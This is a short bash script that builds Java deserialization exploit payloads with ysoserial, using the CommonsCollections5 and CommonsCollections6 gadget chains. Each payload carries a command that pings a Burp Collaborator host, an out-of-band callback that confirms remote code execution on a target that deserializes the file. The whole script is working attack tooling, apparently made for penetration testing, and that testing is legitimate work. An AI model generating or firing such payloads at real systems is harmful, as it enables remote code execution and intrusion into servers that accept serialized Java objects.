#!/bin/bash
set -x
URL=h7pmtb8agmtwfeb762gxnzgs8jed22.burpcollaborator.net
PAYLOAD=CommonsCollections5
FILE=payload-${PAYLOAD}.bin
echo -e "\n-- Creating test payload using $PAYLOAD and saving it to $FILE..."
java -jar ysoserial.jar $PAYLOAD "ping -c 3 $URL" > "$FILE"

URL=8bkdx2c1kdxnj5fyatkorqkjcai16q.burpcollaborator.net
PAYLOAD=CommonsCollections6
FILE=payload-${PAYLOAD}.bin
echo -e "\n-- Creating test payload using $PAYLOAD and saving it to $FILE..."
java -jar ysoserial.jar $PAYLOAD "ping -c 1 $URL" > "$FILE"
